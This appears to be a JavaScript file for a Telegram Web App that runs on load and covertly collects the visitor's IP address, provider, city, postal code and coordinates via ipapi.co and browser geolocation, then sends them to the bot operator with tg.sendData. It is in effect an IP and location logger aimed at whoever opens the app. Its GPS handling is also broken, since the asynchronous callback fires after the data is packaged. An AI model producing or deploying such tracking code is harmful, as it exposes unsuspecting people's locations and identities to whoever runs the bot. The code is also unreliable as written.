function mapToJSON(map) {
  return JSON.stringify(Object.fromEntries(map));
}

const request = async () => { // Calling a "synchronous" fetch
    let tg = window.Telegram.WebApp;
	
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    // Declaring variables
	let date = new Date().toLocaleString('de-DE', { timeZone: 'UTC' });

	let event = bowser.getParser(navigator.userAgent);
	let browser = event.parsedResult.browser.name + " " + event.parsedResult.browser.version;
	let os = event.parsedResult.os.name + " " + event.parsedResult.os.version;
	let useragent = navigator.userAgent;
	
    var ip = data.ip;
    var provider = data.org + " (" + data.asn + ")";

    var timezone = data.timezone;
    var country = data.country_name;
    var countryCode = data.country_code;
    var region = data.region + " (" + data.region_code + ")";
    var city = data.city;

	var accuracy = "IP";
	var accuracy_radius = "ip";
	var zip = data.postal;
    var lat = data.latitude;
    var lon = data.longitude;
    
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
			(position) =>  {
				accuracy = "GPS";
				accuracy_radius = position.coords.accuracy;
				lat = position.coords.latitude;
				lon = position.coords.longitude;
			});
    }

    const map = new Map([
	["date", date],
	["ip", ip],
	["provider", provider],
	["timezone", timezone],
	["country", country],
	["country_code", countryCode],
	["region", region],
	["city", city],
	["zip", zip],
	["latitude", lat],
	["longitude", lon]
    ]);

	console.log(date);
	console.log(browser);
	console.log(os);
	console.log(useragent);
    console.log(ip);
    console.log(provider);
    console.log(timezone);
    console.log(country);
    console.log(countryCode);
    console.log(region);
    console.log(city);
    console.log(zip);
    console.log(lat);
    console.log(lon);
    console.log(accuracy);
    console.log(accuracy_radius);

    const log = mapToJSON(map);
    tg.sendData(log);
}

request();
